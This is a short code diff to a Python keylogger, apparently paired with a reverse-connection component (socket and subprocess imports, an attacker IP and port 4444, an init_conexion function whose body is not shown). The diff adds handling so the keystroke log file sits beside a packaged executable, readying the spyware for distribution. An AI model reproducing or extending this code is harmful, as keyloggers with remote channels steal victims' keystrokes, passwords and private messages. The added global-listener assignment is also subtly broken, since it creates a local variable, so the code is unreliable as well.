@@ -2,10 +2,21 @@ import socket, subprocess, os
 from pynput import keyboard
 import threading
 import time
+import sys
 
 IP_ATTACK = "127.0.0.1"
 PORT = 4444
 ARCHIVO_LOG = "os_log.txt"
+
+if getattr(sys, 'frozen', False):
+
+    DIRECTORIO_BASE = os.path.dirname(sys.executable)
+else:
+    DIRECTORIO_BASE = os.path.dirname(os.path.abspath(__file__))
+
+ARCHIVO_LOG = os.path.join(DIRECTORIO_BASE, "os_log.txt")
+
+listener = None
 
 def on_press(key):
     try:
@@ -29,7 +40,8 @@ def on_press(key):
         pass
 
 def iniciar_keylogger():
-    with keyboard.Listener(on_press=on_press) as listener:
+    with keyboard.Listener(on_press=on_press) as l:
+        listener = l
         listener.join()
 
 def init_conexion():
